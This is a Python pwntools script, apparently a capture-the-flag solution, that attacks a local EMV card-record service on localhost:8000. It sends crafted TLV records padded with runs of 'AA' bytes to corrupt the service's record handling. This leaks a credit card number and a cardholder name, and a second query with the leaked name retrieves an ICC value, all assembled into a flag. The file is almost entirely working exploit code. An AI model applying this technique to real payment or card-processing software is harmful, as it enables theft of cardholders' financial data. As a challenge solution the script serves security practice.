from pwn import *


def name_emv(name):
    return str.encode('5F20' + '0' + str(int(len(name) / 2)) + name)


def get_cc():
    # r = process('./main')
    r = remote('localhost', 8000)

    for i in range(7):
        r.recvuntil(b'Read record')
        r.sendline(b'1')
        r.sendline(name_emv(hex(ord("A") + i)[2:] * 4))

    r.recvuntil(b'Read record')
    r.sendline(b'1')
    r.sendline(name_emv(hex(ord("i"))[2:] * 4) + b'887F' + b'AA' * 16)

    r.recvuntil(b'Read record')
    r.sendline(b'1')
    r.sendline(name_emv(hex(ord("i"))[2:] * 4) + b'887F' + b'AA' * 57)

    r.recvuntil(b'Read record')
    r.sendline(b'2')
    r.sendline(b'iiii')

    r.recvline()
    r.recvline()
    credit_card = r.recvline()
    credit_card = credit_card.split(b': ')[1].replace(b'A', b'').strip().decode('utf-8')[:12]

    return credit_card


def get_name():
    # r = process('./main')
    r = remote('localhost', 8000)

    for i in range(7):
        r.recvuntil(b'Read record')
        r.sendline(b'1')
        r.sendline(name_emv(hex(ord("A") + i)[2:] * 4))

    r.recvuntil(b'Read record')
    r.sendline(b'1')
    r.sendline(name_emv(hex(ord("i"))[2:] * 4) + b'887F' + b'AA' * 16)

    r.recvuntil(b'Read record')
    r.sendline(b'1')
    r.sendline(name_emv(hex(ord("i"))[2:] * 4) + b'887F' + b'AA' * 42)

    r.recvuntil(b'Read record')
    r.sendline(b'2')
    r.sendline(b'iiii')

    r.recvline()
    r.recvline()
    name = r.recvline()
    name = name.split(b': ')[1].replace(b'A', b'').strip().decode('utf-8')[:22]
    name = bytes.fromhex(name).decode('ASCII')
    return name


def get_icc(name):
    # r = process('./main')
    r = remote('localhost', 8000)

    r.recvuntil(b'Read record')
    r.sendline(b'2')
    r.sendline(name.encode('ASCII'))
    r.recvline()
    r.recvline()
    r.recvline()
    icc = r.recvline().split(b': ')[1].strip().decode('utf-8')
    return icc

pan = get_cc()
icc = get_icc(get_name())
print('flag{' + icc + pan + '}')
